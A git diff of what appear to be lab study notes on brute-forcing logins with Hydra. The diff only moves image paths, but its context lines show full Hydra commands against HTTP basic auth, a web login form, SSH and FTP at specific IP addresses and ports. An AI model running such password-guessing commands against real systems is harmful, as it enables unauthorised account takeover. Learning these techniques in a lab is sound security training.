@@ -156,7 +156,7 @@ Basic auth is a challenge-response protocol, where the server demands credential
 
 A GET request containing basic auth:
 
-![Filtered output](images/basic-auth.png)
+![Filtered output](.images/basic-auth.png)
 
 **Example:**
 
@@ -166,7 +166,7 @@ Brute force basic auth using the **http-get** module:
 hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt 94.237.60.55 http-get / -s 58596
 ```
 
-![Filtered output](images/basic-auth2.png)
+![Filtered output](.images/basic-auth2.png)
 
 ## Attacking Login Forms
 
@@ -197,11 +197,11 @@ The **condition string** is crucial for distinguishing between valid and invalid
 
 The following request was intercepted from a login form:
 
-![Filtered output](images/loginform.png)
+![Filtered output](.images/loginform.png)
 
 When entering random credentials an error message saying "**Invalid credentials**" pops up:
 
-![Filtered output](images/loginform2.png)
+![Filtered output](.images/loginform2.png)
 
 We have obtained all information necessary in order to craft a proper Hydra command:
 
@@ -209,7 +209,7 @@ We have obtained all information necessary in order to craft a proper Hydra comm
 hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt 94.237.61.242 -s 55332 http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials" -f
 ```
 
-![Filtered output](images/loginform3.png)
+![Filtered output](.images/loginform3.png)
 
 ## Attacking SSH and FTP
 
@@ -221,7 +221,7 @@ SSH and FTP facilitate secure remote access and file management. However, they o
 hydra -l sshuser -P 2023-200_most_used_passwords.txt ssh://94.237.54.192
 ```
 
-![Filtered output](images/ssh.png)
+![Filtered output](.images/ssh.png)
 
 ```bash
 hydra -l ftpuser -P 2023-200_most_used_passwords.txt ftp://94.237.54.192
